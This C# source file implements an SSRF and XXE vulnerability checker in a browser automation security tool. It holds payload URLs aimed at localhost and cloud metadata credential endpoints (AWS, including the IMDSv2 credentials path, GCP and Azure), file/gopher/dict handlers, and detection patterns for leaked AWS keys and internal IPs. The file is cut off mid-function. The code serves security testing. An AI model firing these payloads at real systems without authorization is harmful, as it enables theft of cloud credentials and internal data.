using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Trowser.Automation;
using Trowser.Robustness;

namespace Trowser.Security;

/// <summary>
/// Probes URL-like parameters with SSRF payloads (internal IPs, cloud metadata, protocol handlers,
/// callback URLs) and detects in-band data leakage plus Tier 1 client-side OOB callbacks.
/// </summary>
public sealed class SsrfChecker
{
    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;
    private bool _useBackendFetch;
    private bool _includeBrowserCookies;
    private string _minConfidence = "likely";

    private static readonly string[] DefaultParamNames = UrlLikeParamNames.Default;

    private static readonly (string Indicator, string Pattern)[] MetadataPatterns =
    [
        ("aws-metadata", "ami-id"),
        ("aws-metadata", "instance-id"),
        ("aws-metadata", "instance-type"),
        ("aws-metadata", "AccessKeyId"),
        ("aws-metadata", "SecretAccessKey"),
        ("gcp-metadata", "computeMetadata"),
        ("gcp-metadata", "serviceAccounts"),
        ("gcp-metadata", "project/project-id"),
        ("azure-metadata", "metadata/instance"),
        ("azure-metadata", "subscriptionId"),
        ("do-metadata", "droplet_id"),
        ("alibaba-metadata", "owner-account"),
        ("oracle-metadata", "opc/identity"),
        ("oracle-metadata", "canonicalRegion"),
    ];

    private static readonly Regex AwsAccessKeyRegex = new(@"AKIA[A-Z0-9]{16}", RegexOptions.Compiled);

    private const string AwsMetadataUrl = "http://169.254.169.254/latest/meta-data/";
    private const string AwsImdsV2TokenUrl = "http://169.254.169.254/latest/api/token";
    private const string AwsImdsV2CredsUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
    private const string GcpMetadataUrl = "http://metadata.google.internal/computeMetadata/v1/";
    private const string AzureMetadataUrl = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";

    internal static readonly string[] ScaffoldPaths =
    [
        "/api/fetch", "/api/proxy", "/proxy", "/fetch", "/api/url", "/api/preview",
        "/api/webhook", "/api/image", "/avatar", "/stock", "/check-stock", "/api/stock", "/api/check-stock"
    ];

    internal static readonly string[] ScaffoldParamNames =
    [
        "url", "link", "target", "callback", "redirect", "fetch"
    ];

    /// <summary>Phase-1 SSRF probes — extended payloads run only when these show a signal.</summary>
    private static readonly string[] Phase1SsrfPayloads =
    [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost"
    ];

    private static readonly string[] ErrorPatterns =
    [
        "ECONNREFUSED",
        "Connection refused",
        "Connection timed out",
        "No route to host",
        "connect ETIMEDOUT",
        "getaddrinfo ENOTFOUND",
        "Unable to connect",
        "Failed to connect",
        "Connection reset",
        "Name or service not known",
        "invalid URL",
        "unsupported protocol",
        "protocol not supported",
        "unknown scheme",
        "HTTPConnectionPool",
        "NewConnectionError",
        "Failed to establish a new connection",
        "Could not resolve host",
        "java.net.ConnectException",
        "UnknownHostException",
        "fetch failed",
        "AggregateError",
        "Blocked illegal activity",
        "illegal activity",
        "blocked by",
        "i/o timeout",
    ];

    private static readonly Regex InternalIpInErrorRegex = new(
        @"(?:\b|::ffff:)(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|127\.0\.0\.1)\b",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static readonly Regex FetchStackTraceRegex = new(
        @"\w*[Uu]rl\w*\.js:\d+|\w*/(?:routes|build)/\w*(?:fetch|request|url|download|proxy|webhook)\w*\.js:\d+",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static readonly Regex[] ErrorBasedSsrfRegexes =
    [
        new(@"blocked.*activit", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new(@"invalid.*url", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new(@"connection.*refused", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new(@"url.*(fetch|request|retrieve|download)", RegexOptions.IgnoreCase | RegexOptions.Compiled),
        new(@"(fetch|request|retrieve).*(failed|error|timeout)", RegexOptions.IgnoreCase | RegexOptions.Compiled),
    ];

    private static readonly string[] FetchStackMarkers =
    [
        "HttpClient", "axios", "urllib", "requests.get", "requests.post", "node-fetch",
        "RestTemplate", "WebClient", "curl_easy", "file_get_contents", "HttpWebRequest"
    ];

    public SsrfChecker(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public async Task<SsrfResult> RunAsync(SsrfOptions options)
    {
        _minConfidence = string.IsNullOrWhiteSpace(options.MinConfidence) ? "likely" : options.MinConfidence.Trim().ToLowerInvariant();
        _useBackendFetch = options.UseBackendFetch;
        _includeBrowserCookies = options.IncludeBrowserCookies;

        var findings = new List<SsrfFinding>();
        var candidatesProbed = 0;
        var payloadsSent = 0;

        if (options.RequestTemplate != null)
        {
            var urlResult = await RunTemplateModeAsync(options);
            findings.AddRange(urlResult.Findings);
            candidatesProbed += urlResult.CandidatesProbed;
            payloadsSent += urlResult.PayloadsSent;
        }
        else
        {
            var urlResult = await RunDiscoveryModeAsync(options);
            findings.AddRange(urlResult.Findings);
            candidatesProbed += urlResult.CandidatesProbed;
            payloadsSent += urlResult.PayloadsSent;
        }

        if (options.IncludeXxe)
        {
            var xxeResult = await RunXxeModeAsync(options);
            findings.AddRange(xxeResult.Findings);
            candidatesProbed += xxeResult.CandidatesProbed;
            payloadsSent += xxeResult.PayloadsSent;
        }

        if (options.IncludeUploadXxe)
        {
            var uploadXxe = await UploadXxeProbe.RunAsync(_ctx, new UploadXxeProbe.UploadXxeOptions
            {
                MaxCandidates = options.MaxCandidates,
                TimeoutMs = options.TimeoutMs,
                IncludeBrowserCookies = options.IncludeBrowserCookies
            }, _log);
            foreach (var f in uploadXxe.Findings)
            {
                findings.Add(new SsrfFinding
                {
                    Type = "xxe-upload",
                    Severity = f.Severity,
                    Confidence = "likely",
                    Url = f.Url,
                    Method = "POST",
                    ParamName = f.Shape,
                    Payload = f.Signal,
                    Status = f.Status,
                    Snippet = f.Detail
                });
            }
            candidatesProbed += uploadXxe.CandidatesProbed;
            payloadsSent += uploadXxe.ProbesSent;
        }

        if (candidatesProbed == 0 && payloadsSent == 0 && findings.Count == 0)
        {
            return new SsrfResult
            {
                Message = "No SSRF/XXE candidates found. Browse the app (capture XML POST endpoints for XXE), " +
                          "pass explicit \"urls\", or use a \"request\" template.",
                CandidatesProbed = 0,
                PayloadsSent = 0,
                Findings = findings
            };
        }

        return BuildResult(DeduplicateFindings(findings), candidatesProbed, payloadsSent);
    }

    private static List<SsrfFinding> DeduplicateFindings(List<SsrfFinding> findings)
    {
        if (findings.Count <= 1) return findings;

        var map = new Dictionary<string, SsrfFinding>(StringComparer.OrdinalIgnoreCase);
        var order = new List<string>();

        foreach (var f in findings)
        {
            var key = $"{f.Type}|{f.Indicator}|{f.Url}|{f.Method}|{f.ParamName}";
            if (map.TryGetValue(key, out var existing))
            {
                var payloads = existing.PayloadVariants?.ToList() ?? [existing.Payload];
                if (!payloads.Contains(f.Payload, StringComparer.Ordinal))
                    payloads.Add(f.Payload);
                map[key] = new SsrfFinding
                {
                    Type = existing.Type,
                    Severity = existing.Severity,
                    Confidence = existing.Confidence,
                    Url = existing.Url,
                    Method = existing.Method,
                    ParamName = existing.ParamName,
                    Payload = existing.Payload,
                    Status = existing.Status,
                    BaselineStatus = existing.BaselineStatus,
                    Indicator = existing.Indicator,
                    Snippet = existing.Snippet,
                    CorrelationId = existing.CorrelationId,
                    Occurrences = existing.Occurrences + 1,
                    PayloadVariants = payloads
                };
            }
            else
            {
                order.Add(key);
                map[key] = f;
            }
        }

        return order.Select(k => map[k]).ToList();
    }

    private async Task<SsrfResult> RunTemplateModeAsync(SsrfOptions options)
    {
        var tpl = options.RequestTemplate!;
        var markers = RequestMarkerSubstitute.ListMarkers(tpl.Url, tpl.Body);
        if (markers.Count == 0)
            throw new ArgumentException(InjectionRequestErrors.WithRequestExample(
                "Request template must contain at least one §ssrf§ (or other) marker injection point."));

        var marker = options.MarkerName ?? markers[0];
        var baseline = options.BaselineValue ?? "https://example.com";
        var payloads = ResolvePayloads(options);
        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;
        var findings = new List<SsrfFinding>();
        var correlationMap = new Dictionary<string, SsrfProbeContext>(StringComparer.OrdinalIgnoreCase);
        var detector = PrepareCallbackDetector(options, correlationMap);

        _log($"SSRF(template): marker §{marker}§, {payloads.Count} payload(s)", "#888888");

        var (baseStatus, baseBody) = await FetchAsync(
            RequestMarkerSubstitute.ReplaceNamed(tpl.Url, new Dictionary<string, string> { [marker] = baseline }),
            tpl.Method,
            tpl.Headers,
            tpl.Body != null ? RequestMarkerSubstitute.ReplaceNamed(tpl.Body, new Dictionary<string, string> { [marker] = baseline }) : null,
            timeout);

        foreach (var payload in payloads)
        {
            var markerValues = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { [marker] = payload };
            var url = RequestMarkerSubstitute.ReplaceNamed(tpl.Url, markerValues);
            var body = tpl.Body != null ? RequestMarkerSubstitute.ReplaceNamed(tpl.Body, markerValues) : null;
            await ProbeAndAnalyzeAsync(url, tpl.Method, tpl.Headers, body, payload, marker, baseStatus, baseBody, timeout, findings);
        }

        if (options.IncludeCallbackProbes && detector != null)
        {
            var probeUrl = detector.GenerateProbeUrl($"ssrf-{marker}");
            TrackCorrelation(correlationMap, probeUrl, tpl.Url, tpl.Method, marker, probeUrl);
            var markerValues = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { [marker] = probeUrl };
            var url = RequestMarkerSubstitute.ReplaceNamed(tpl.Url, markerValues);
            var body = tpl.Body != null ? RequestMarkerSubstitute.ReplaceNamed(tpl.Body, markerValues) : null;
            await ProbeAndAnalyzeAsync(url, tpl.Method, tpl.Headers, body, probeUrl, marker, baseStatus, baseBody, timeout, findings);
        }

        await CollectCallbackFindingsAsync(detector, correlationMap, findings, options.CallbackWaitMs);

        return BuildResult(findings, candidatesProbed: 1, payloads.Count + (options.IncludeCallbackProbes ? 1 : 0));
    }

    private async Task<SsrfResult> RunDiscoveryModeAsync(SsrfOptions options)
    {
        var findings = new List<SsrfFinding>();
        var correlationMap = new Dictionary<string, SsrfProbeContext>(StringComparer.OrdinalIgnoreCase);
        var detector = PrepareCallbackDetector(options, correlationMap);

        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running SSRF tests.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var allowedOrigins = ResolveAllowedOrigins(currentUri, options.AllowedHosts);
        var paramNames = new HashSet<string>(
            (options.ParamNames is { Count: > 0 } ? options.ParamNames : DefaultParamNames.ToList())
            .Select(p => p.ToLowerInvariant()));

        var max = options.MaxCandidates > 0 ? options.MaxCandidates : 10;
        var hasExplicit = options.ExplicitUrls is { Count: > 0 } || options.EndpointHints is { Count: > 0 };

        var fromExplicit = options.ExplicitUrls is { Count: > 0 }
            ? BuildCandidatesFromUrls(options.ExplicitUrls, paramNames, max * 3)
            : [];
        var fromHints = options.EndpointHints is { Count: > 0 }
            ? BuildCandidatesFromHints(options.EndpointHints, paramNames, max * 3)
            : [];

        var fromNetwork = new List<SsrfCandidate>();
        foreach (var allowedOrigin in allowedOrigins)
            fromNetwork.AddRange(DiscoverCandidates(_ctx.Network.Entries, allowedOrigin, paramNames, max * 3));

        var fromDom = new List<SsrfCandidate>();
        if (options.IncludeDomDiscovery)
        {
            var domPoints = await RedirectParamDiscovery.DiscoverFromDomAsync(_ctx, origin, paramNames, max * 2);
            foreach (var pt in domPoints)
            {
                fromDom.Add(new SsrfCandidate(
                    pt.BaseUri, pt.ParamName, pt.OriginalValue ?? "", pt.Method, null));
            }

            var formPoints = await RedirectParamDiscovery.DiscoverFromFormsAsync(_ctx, origin, paramNames, max * 2);
            foreach (var pt in formPoints)
            {
                fromDom.Add(SsrfCandidate.FromHintBody(
                    pt.BaseUri, pt.ParamName, pt.Method, new EndpointParamHint
                    {
                        Url = pt.BaseUri.ToString(),
                        Method = pt.Method,
                        ParamNames = [pt.ParamName],
                        RequestBodySample = pt.Method is "POST" or "PUT" or "PATCH"
                            ? $"{pt.ParamName}={Uri.EscapeDataString(pt.OriginalValue ?? "https://example.com")}"
                            : null,
                        Headers = pt.Method is "POST" or "PUT" or "PATCH"
                            ? new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                                { ["Content-Type"] = "application/x-www-form-urlencoded" }
                            : null
                    }));
            }
        }

        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;
        var fromScaffold = new List<SsrfCandidate>();
        var realSourceCount = fromExplicit.Count + fromHints.Count + fromNetwork.Count + fromDom.Count;
        var allowScaffold = options.IncludeScaffoldPaths && options.RequestTemplate == null;
        if (allowScaffold && (realSourceCount == 0 || options.IncludeScaffoldWithExplicit))
        {
            foreach (var allowedOrigin in allowedOrigins)
            {
                var scaffold = BuildScaffoldCandidates(allowedOrigin, max * 2);
                scaffold = await FilterScaffoldCandidatesAsync(scaffold, timeout);
                fromScaffold.AddRange(scaffold);
                if (fromScaffold.Count >= max) break;
            }
        }

        var candidates = PrioritizeSsrfCandidates(
            fromExplicit, fromHints, fromNetwork, fromDom, fromScaffold, max);

        if (fromScaffold.Count > 0 && candidates.Any(c => fromScaffold.Any(s =>
                $"{s.Method}|{s.BaselineUrl}|{s.ParamName}".Equals(
                    $"{c.Method}|{c.BaselineUrl}|{c.ParamName}", StringComparison.OrdinalIgnoreCase))))
            _log($"SSRF: {candidates.Count} candidate(s) (scaffold used as last resort)", "#888888");

        if (candidates.Count == 0 && !options.IncludeXxe)
        {
            return new SsrfResult
            {
                Message = "No candidate URLs with URL-like parameters found. Browse the app, pass explicit \"urls\", " +
                          "or use a \"request\" template with §ssrf§ markers.",
                CandidatesProbed = 0,
                PayloadsSent = 0,
                Findings = findings
            };
        }

        if (candidates.Count == 0)
        {
            return new SsrfResult { CandidatesProbed = 0, PayloadsSent = 0, Findings = findings };
        }

        var allPayloads = ResolvePayloads(options);
        var payloadsSent = 0;
        var phased = options.UsePhasedProbing;
        var phase2Count = phased ? GetPhase2Payloads(allPayloads).Count : allPayloads.Count;

        _log(phased
            ? $"SSRF(discovery): {candidates.Count} candidate(s), phased probing (phase1≈3, phase2≤{phase2Count} on signal)"
            : $"SSRF(discovery): {candidates.Count} candidate(s) × {allPayloads.Count} payload(s)",
            "#888888");

        foreach (var cand in candidates)
        {
            var neutralValue = string.IsNullOrWhiteSpace(options.BaselineValue)
                ? "https://example.com"
                : options.BaselineValue.Trim();
            var neutralUrl = cand.HasBodyInjection ? cand.BaselineUrl : cand.BuildUrl(neutralValue);
            var neutralBody = cand.HasBodyInjection ? cand.BuildBody(neutralValue) : cand.BaselineBody;

            var (baseStatus, baseBody) = await FetchAsync(
                neutralUrl, cand.Method, cand.Headers, neutralBody, timeout);
            if (baseStatus == 0 && string.IsNullOrEmpty(baseBody))
                _log($"  baseline fetch failed for {neutralUrl} — continuing with probes", "#CCA700");

            var findingsBefore = findings.Count;
            var phase1 = phased
                ? BuildPhase1Payloads(options, detector, cand.ParamName)
                : allPayloads;

            foreach (var payload in phase1)
            {
                var testUrl = cand.BuildUrl(payload);
                var testBody = cand.BuildBody(payload);
                if (options.IncludeCallbackProbes && detector != null
                    && !Phase1SsrfPayloads.Contains(payload, StringComparer.OrdinalIgnoreCase))
                    TrackCorrelation(correlationMap, payload, cand.BaselineUrl, cand.Method, cand.ParamName, payload);
                await ProbeAndAnalyzeAsync(testUrl, cand.Method, cand.Headers, testBody, payload, cand.ParamName,
                    baseStatus, baseBody, timeout, findings);
                payloadsSent++;

                if (HasCriticalCloudMetadataHit(findings, findingsBefore))
                {
                    _log($"  early-stop: critical cloud-metadata SSRF on {cand.ParamName}", "#F44747");
                    break;
                }
            }

            var escalate = !phased || findings.Count > findingsBefore;

            if (!escalate)
                continue;

            if (HasCriticalCloudMetadataHit(findings, findingsBefore))
                continue;

            var phase2 = phased ? GetPhase2Payloads(allPayloads) : [];
            foreach (var payload in phase2)
            {
                var testUrl = cand.BuildUrl(payload);
                var testBody = cand.BuildBody(payload);
                await ProbeAndAnalyzeAsync(testUrl, cand.Method, cand.Headers, testBody, payload, cand.ParamName,
                    baseStatus, baseBody, timeout, findings);
                payloadsSent++;

                if (HasCriticalCloudMetadataHit(findings, findingsBefore))
                {
                    _log($"  early-stop: critical cloud-metadata SSRF on {cand.ParamName}", "#F44747");
                    break;
                }
            }

            if (HasCriticalCloudMetadataHit(findings, findingsBefore))
                continue;

            if (options.IncludeCloudMetadataHeaders)
            {
                payloadsSent += await ProbeCloudMetadataHeadersAsync(
                    cand, baseStatus, baseBody, timeout, findings);
            }

            if (options.IncludeImdsV2Pivot)
            {
                var imdsSent = await AttemptImdsV2PivotAsync(
                    cand, baseStatus, baseBody, timeout, findings);
                payloadsSent += imdsSent;
            }

            if (!phased && options.IncludeCallbackProbes && detector != null)
            {
                var probeUrl = detector.GenerateProbeUrl($"ssrf-{cand.ParamName}");
                TrackCorrelation(correlationMap, probeUrl, cand.BaselineUrl, cand.Method, cand.ParamName, probeUrl);
                var testUrl = cand.BuildUrl(probeUrl);
                var testBody = cand.BuildBody(probeUrl);
                await ProbeAndAnalyzeAsync(testUrl, cand.Method, cand.Headers, testBody, probeUrl, cand.ParamName,
                    baseStatus, baseBody, timeout, findings);
                payloadsSent++;
            }
        }

        await CollectCallbackFindingsAsync(detector, correlationMap, findings, options.CallbackWaitMs);

        return BuildResult(findings, candidates.Count, payloadsSent);
    }

    private CallbackDetector? PrepareCallbackDetector(SsrfOptions options, Dictionary<string, SsrfProbeContext> correlationMap)
    {
        if (!options.IncludeCallbackProbes) return null;
        var detector = _ctx.CallbackDetector;
        if (detector == null) return null;
        if (!detector.Active)
            detector.Start(options.CallbackDomain);
        _ = correlationMap;
        return detector;
    }

    private static void TrackCorrelation(
        Dictionary<string, SsrfProbeContext> map, string probeUrl, string endpoint, string method, string param, string payload)
    {
        var id = ExtractProbeId(probeUrl);
        if (id == null) return;
        map[id] = new SsrfProbeContext(endpoint, method, param, payload);
    }

    private async Task ProbeAndAnalyzeAsync(
        string url, string method, Dictionary<string, string>? headers, string? body,
        string payload, string paramName, int baseStatus, string? baseBody, int timeout,
        List<SsrfFinding> findings, Dictionary<string, string>? extraHeaders = null)
    {
        int status;
        string respBody;
        string? location = null;
        var useManual = ShouldUseManualRedirect(paramName, baseStatus);
        var mergedHeaders = MergeHeaders(headers, extraHeaders);

        try
        {
            if (useManual)
            {
                var json = await _ctx.Fetch(url, method, mergedHeaders, body, timeout, "manual");
                using var doc = JsonDocument.Parse(json);
                status = doc.RootElement.GetProperty("status").GetInt32();
                respBody = doc.RootElement.TryGetProperty("body", out var b) ? b.GetString() ?? "" : "";
                location = RedirectAnalysis.TryGetLocationFromFetchJson(json);
            }
            else
            {
                (status, respBody) = await FetchAsync(url, method, mergedHeaders, body, timeout);
            }
        }
        catch (Exception ex)
        {
            _log($"  fetch failed {url}: {ex.Message}", "#CCA700");
            return;
        }

        var detection = DetectSsrfIndicator(payload, respBody, baseBody, baseStatus, status);
        if (detection == null && useManual && !string.IsNullOrEmpty(location)
            && Uri.TryCreate(url, UriKind.Absolute, out var requestUriForLocation))
            detection = DetectSsrfInLocation(payload, location, baseBody, requestUriForLocation);
        TryAddFinding(findings, detection, "in-band", url, method, paramName, payload, status, baseStatus,
            !string.IsNullOrEmpty(location) ? $"Location: {location}" : respBody);
    }

    private static bool ShouldUseManualRedirect(string paramName, int baselineStatus) =>
        UrlLikeParamNames.IsRedirectLikeName(paramName) || RedirectAnalysis.IsRedirectStatus(baselineStatus);

    private static SsrfDetectionResult? DetectSsrfInLocation(
        string payload, string location, string? baseline, Uri requestUri)
    {
        if (RedirectAnalysis.IsSuppressedSameOriginLoginRedirect(
                requestUri, RedirectAnalysis.DefaultProbeHost, location))
            return null;

        var combined = location;
        if (!string.IsNullOrEmpty(baseline))
            combined += " " + baseline;

        foreach (var (indicator, pattern) in MetadataPatterns)
        {
            if (location.Contains(pattern, StringComparison.OrdinalIgnoreCase) &&
                (string.IsNullOrEmpty(baseline) || !baseline.Contains(pattern, StringComparison.OrdinalIgnoreCase)))
                return new SsrfDetectionResult(indicator, "likely", ClassifySeverity(indicator, "likely"));
        }

        if (payload.StartsWith("file:", StringComparison.OrdinalIgnoreCase) &&
            location.Contains("file:", StringComparison.OrdinalIgnoreCase))
            return new SsrfDetectionResult("file-scheme-redirect", "likely",
                ClassifySeverity("file-disclosure", "likely"));

        if (IsInternalPayload(payload))
        {
            var host = ExtractHostFromPayload(payload);
            if (!string.IsNullOrEmpty(host) && location.Contains(host, StringComparison.OrdinalIgnoreCase))
                return new SsrfDetectionResult("internal-host-in-location", "likely",
                    ClassifySeverity("internal-host-reflected", "likely"));
        }

        return null;
    }

    private void TryAddFinding(
        List<SsrfFinding> findings, SsrfDetectionResult? detection, string type,
        string url, string method, string paramName, string payload,
        int status, int baselineStatus, string respBody, string? correlationId = null)
    {
        if (detection == null) return;
        if (ConfidenceRank(detection.Confidence) < ConfidenceRank(_minConfidence))
            return;

        _log($"  FLAG {detection.Indicator} ({detection.Confidence}): {paramName} ← {Truncate(payload, 80)}", "#F44747");
        findings.Add(new SsrfFinding
        {
            Type = type,
            Severity = detection.Severity,
            Confidence = detection.Confidence,
            Url = url,
            Method = method,
            ParamName = paramName,
            Payload = payload,
            Status = status,
            BaselineStatus = baselineStatus,
            Indicator = detection.Indicator,
            Snippet = Snippet(respBody, 240),
            CorrelationId = correlationId
        });
    }

    private async Task CollectCallbackFindingsAsync(
        CallbackDetector? detector,
        Dictionary<string, SsrfProbeContext> correlationMap,
        List<SsrfFinding> findings,
        int waitMs)
    {
        if (detector == null || !detector.Active) return;

        if (waitMs > 0)
            await Task.Delay(waitMs);

        foreach (var interaction in detector.GetInteractions())
        {
            var correlationId = interaction.CorrelationId;
            if (correlationId == null || !correlationMap.ContainsKey(correlationId))
                continue;
            if (!CallbackDetector.IsRequestToCallbackHost(interaction.Url, detector.CallbackDomain))
                continue;

            var ctx = correlationMap[correlationId];
            TryAddFinding(findings,
                new SsrfDetectionResult("dom-ssrf-callback", "confirmed", "high"),
                "oob-client-request", ctx.Endpoint, ctx.Method, ctx.ParamName, ctx.Payload,
                interaction.StatusCode ?? 0, 0,
                interaction.Finding ?? $"Browser callback: {interaction.Method} {interaction.Url}",
                correlationId);
        }
    }

    private static SsrfResult BuildResult(List<SsrfFinding> findings, int candidatesProbed, int payloadsSent)
    {
        var deduped = findings
            .GroupBy(f => $"{f.Type}|{f.Url}|{f.ParamName}|{f.Payload}|{f.Indicator}", StringComparer.OrdinalIgnoreCase)
            .Select(g => g.First())
            .OrderByDescending(f => ConfidenceRank(f.Confidence))
            .ThenByDescending(f => SeverityRank(f.Severity))
            .ToList();

        var msg = deduped.Count > 0
            ? $"{deduped.Count} SSRF/XXE indicator(s) detected (in-band leakage, XXE entity expansion, and/or callback correlation)."
            : "No SSRF/XXE indicators detected for probed targets (false negatives are still possible).";

        return new SsrfResult
        {
            Message = msg,
            CandidatesProbed = candidatesProbed,
            PayloadsSent = payloadsSent,
            Findings = deduped
        };
    }

    private static bool HasCriticalCloudMetadataHit(List<SsrfFinding> findings, int fromIndex)
    {
        for (var i = fromIndex; i < findings.Count; i++)
        {
            var f = findings[i];
            if (f.Indicator is "aws-metadata" or "aws-imdsv2-metadata" or "gcp-metadata" or "azure-metadata"
                && (f.Severity.Equals("critical", StringComparison.OrdinalIgnoreCase)
                    || f.Severity.Equals("high", StringComparison.OrdinalIgnoreCase)
                    || f.Confidence.Equals("confirmed", StringComparison.OrdinalIgnoreCase)))
                return true;
        }
        return false;
    }

    private static List<string> ResolvePayloads(SsrfOptions options)
    {
        if (options.Payloads is { Count: > 0 })
            return options.Payloads;

        var all = FuzzerPayloads.BuiltIn["ssrf"];
        var list = new List<string>();

        foreach (var p in all)
        {
            var lower = p.ToLowerInvariant();
            if (!options.IncludeProtocolHandlers &&
                (lower.StartsWith("file:") || lower.StartsWith("gopher:") || lower.StartsWith("dict:")))
                continue;

            if (!options.IncludeInternalIps &&
                !lower.StartsWith("file:") && !lower.StartsWith("gopher:") && !lower.StartsWith("dict:") &&
                !lower.Contains("burpcollaborator"))
                continue;

            list.Add(p);
        }

        return list.Count > 0 ? list : all.ToList();
    }

    private static List<string> BuildPhase1Payloads(SsrfOptions options, CallbackDetector? detector, string paramName)
    {
        var list = new List<string>(Phase1SsrfPayloads);
        if (options.IncludeCallbackProbes && detector != null)
        {
            list.RemoveAll(p => p.Equals("http://localhost", StringComparison.OrdinalIgnoreCase));
            list.Add(detector.GenerateProbeUrl($"ssrf-{paramName}"));
        }

        return list;
    }

    private static List<string> GetPhase2Payloads(IReadOnlyList<string> allPayloads)
    {
        var phase1Set = new HashSet<string>(Phase1SsrfPayloads, StringComparer.OrdinalIgnoreCase);
        return allPayloads.Where(p => !phase1Set.Contains(p)).ToList();
    }

    private async Task<(int Status, string Body)> FetchAsync(
        string url, string method, Dictionary<string, string>? headers, string? body, int timeout)
    {
        try
        {
            if (_useBackendFetch)
            {
                var result = await SecurityProbeHttp.FetchAsync(
                    _ctx, url, method, headers, body, timeout, _includeBrowserCookies);
                return (result.Status, result.Body);
            }

            var json = await _ctx.Fetch(url, method, headers, body, timeout);
            using var doc = JsonDocument.Parse(json);
            var status = doc.RootElement.GetProperty("status").GetInt32();
            var text = doc.RootElement.TryGetProperty("body", out var b) ? b.GetString() ?? "" : "";
            return (status, text);
        }
        catch (Exception ex) when (ex is TaskCanceledException or OperationCanceledException or TimeoutException)
        {
            _log($"  fetch timed out {url}: {ex.Message}", "#CCA700");
            return (0, "");
        }
        catch (Exception ex)
        {
            _log($"  fetch failed {url}: {ex.Message}", "#CCA700");
            return (0, "");
        }
    }

    internal static SsrfDetectionResult? DetectSsrfIndicator(
        string payload, string body, string? baseline, int status, int baselineStatus)
    {
        if (string.IsNullOrEmpty(body)) body = "";

        var isErrorStatus = status >= 400;
        var looksLikeErrorPage = LooksLikeErrorPage(body, status);
        var cleaned = StripPayloadEchoes(body, payload);
        var cleanedBaseline = string.IsNullOrEmpty(baseline) ? "" : StripPayloadEchoes(baseline, payload);

        var metadata = DetectMetadataIndicator(cleaned, cleanedBaseline);
        if (metadata != null)
        {
            if (isErrorStatus && !HasStrongMetadataEvidence(cleaned, cleanedBaseline))
                return null;
            if (LooksLikeMetadataNoisePage(cleaned) || AuthAccessHeuristics.LooksLikeGenericErrorPage(body, null))
                return null;

            var confidence = ResolveMetadataConfidence(status, looksLikeErrorPage, cleaned, cleanedBaseline);
            return new SsrfDetectionResult(metadata, confidence, ClassifySeverity(metadata, confidence));
        }

        if (payload.StartsWith("file:", StringComparison.OrdinalIgnoreCase))
        {
            if (isErrorStatus && looksLikeErrorPage)
                return null;

            var disclosure = PathTraversalChecker.DetectDisclosure(cleaned, cleanedBaseline, payload);
            if (disclosure != null)
            {
                var indicator = disclosure switch
                {
                    "etc-passwd-pattern" => "file-disclosure",
                    "win.ini-pattern" => "file-disclosure-winini",
                    _ => "file-disclosure"
                };
                return FileDisclosureResult(indicator, disclosure, status, looksLikeErrorPage);
            }
        }

        foreach (var err in ErrorPatterns)
        {
            if (!ContainsNew(cleaned, cleanedBaseline, err))
                continue;
            var confidence = isErrorStatus ? "tentative" : "likely";
            return new SsrfDetectionResult("connection-error-leak", confidence,
                ClassifySeverity("connection-error-leak", confidence));
        }

        var errorBased = DetectErrorBasedSsrfSignal(cleaned, cleanedBaseline, payload, status, baselineStatus);
        if (errorBased != null)
            return errorBased;

        if (IsInternalPayload(payload))
        {
            var host = ExtractHostFromPayload(payload);
            if (!string.IsNullOrEmpty(host) && ContainsNew(cleaned, cleanedBaseline, host))
            {
                if (IsPayloadUrlReflection(body, payload))
                    return null;

                var confidence = status is >= 200 and < 300 ? "likely"
                    : isErrorStatus ? "tentative" : "tentative";
                return new SsrfDetectionResult("internal-host-reflected", confidence,
                    ClassifySeverity("internal-host-reflected", confidence));
            }

            if (status is >= 200 and < 300 && baselineStatus is >= 400 &&
                body.Length > 50 && body != baseline
                && !looksLikeErrorPage && !LooksLikeMetadataNoisePage(cleaned)
                && !AuthAccessHeuristics.LooksLikeGenericErrorPage(body, null))
            {
                return new SsrfDetectionResult("status-anomaly-internal", "tentative",
                    ClassifySeverity("status-anomaly-internal", "tentative"));
            }

            if (!string.IsNullOrEmpty(baseline) && status is >= 200 and < 300 &&
                body.Length > baseline.Length * 2 && body.Length > 200
                && !looksLikeErrorPage && !LooksLikeMetadataNoisePage(cleaned))
            {
                return new SsrfDetectionResult("response-size-anomaly", "tentative",
                    ClassifySeverity("response-size-anomaly", "tentative"));
            }
        }

        // In-band: server returned a distinct HTML document after an http(s) fetch payload
        // (e.g. proxy/SSRF that embeds remote page content) — stronger than status-only hints.
        if (IsHttpUrlPayload(payload) && status is >= 200 and < 300
            && LooksLikeFetchedHtmlDocument(cleaned)
            && !LooksLikeFetchedHtmlDocument(cleanedBaseline)
            && !IsPayloadUrlReflection(body, payload)
            && cleaned.Length > 100
            && (string.IsNullOrEmpty(cleanedBaseline) || cleaned.Length > cleanedBaseline.Length + 40))
        {
            return new SsrfDetectionResult("external-content-fetched", "likely",
                ClassifySeverity("external-content-fetched", "likely"));
        }

        return null;
    }

    private static SsrfDetectionResult FileDisclosureResult(
        string indicator, string disclosureKind, int httpStatus, bool errorPage)
    {
        var confidence = httpStatus is >= 200 and < 300 && !errorPage
                         && disclosureKind is "etc-passwd-pattern" or "win.ini-pattern" or "proc-environ"
            ? "confirmed"
            : "likely";
